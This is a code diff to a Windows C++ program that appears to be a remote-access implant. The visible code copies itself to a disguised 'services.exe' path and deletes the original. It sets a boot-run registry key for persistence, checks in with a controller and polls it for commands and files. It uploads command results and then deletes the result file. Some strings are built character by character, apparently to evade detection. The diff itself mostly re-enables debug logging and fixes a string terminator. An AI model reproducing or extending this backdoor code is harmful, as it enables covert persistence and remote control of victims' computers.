@@ -110,7 +110,7 @@ int init() {
 		g_interval = params->hbi*1000;
 		g_fsize_limit = params->fzLimit*1024*1024;
 
-		//runLog("ip:%u,https:%u,interval:%u,filesize:%u,path:%s\r\n", g_ip, g_httpsToggle, g_interval, g_fsize_limit, params->path);
+		runLog("ip:%u,https:%u,interval:%u,filesize:%u,path:%s\r\n", g_ip, g_httpsToggle, g_interval, g_fsize_limit, params->path);
 
 		char curpath[1024];
 		GetModuleFileNameA(0, curpath, sizeof(curpath));
@@ -142,11 +142,11 @@ int init() {
 			char* mypath = getenv(params->path);
 			char service_path[] = { 's','e','r','v','i','c','e','s',0 };
 			string folder = string(mypath) + "\\" + service_path;
-			char exe_surfix[] = { '.','e','x','e' };
+			char exe_surfix[] = { '.','e','x','e' ,0};
 			string newfn = folder +"\\" + service_path + exe_surfix;
 			if (lstrcmpiA(newfn.c_str(), curpath) != 0)
 			{
-				//runLog("folder:%s,path:%s\r\n",folder.c_str(),newfn.c_str());
+				runLog("folder:%s,path:%s\r\n",folder.c_str(),newfn.c_str());
 
 				CreateDirectoryA(folder.c_str(), 0);
 
@@ -160,7 +160,7 @@ int init() {
 					wsprintfA(szcmd, "\"%s\" /Delete \"%s\"", newfn.c_str(), curpath);
 					ret = WinExec(szcmd, SW_SHOW);
 
-					//runLog("cmd:%s\r\n", szcmd);
+					runLog("cmd:%s\r\n", szcmd);
 
 					ret = setRegBootRun(HKEY_CURRENT_USER,(char*) newfn.c_str());
 
@@ -213,7 +213,7 @@ int __stdcall fileMission() {
 
 	while (TRUE)
 	{
-		runLog("%s %s\r\n", __FILE__, __FUNCTION__);
+		//runLog("%s %s\r\n", __FILE__, __FUNCTION__);
 
 		ret = packet.postCmdFile(CMD_GET_DD_DATA, "",0);
 		int datalen = packet.m_protocol->m_respLen;
@@ -454,6 +454,8 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 
 		ret = packet.postCmd(CMD_ONLINE, 0, 0);
 
+		runLog("test output\r\n");
+
 		int datalen = packet.m_datalen;
 		char* data = packet.m_data;
 		if (datalen > 4 && *(int*)data == DATA_PACK_TAG)
@@ -476,7 +478,7 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 
 					packet.postFile(CMD_RESULT_FILENAME,0, (char*)hdr->hdr.hostname2, hdr->hdr.hostname2_len);
 
-					//DeleteFileA(CMD_RESULT_FILENAME);
+					DeleteFileA(CMD_RESULT_FILENAME);
 				}
 				else if (inpack->type == COMMAND_TYPE_TERMINATE)
 				{
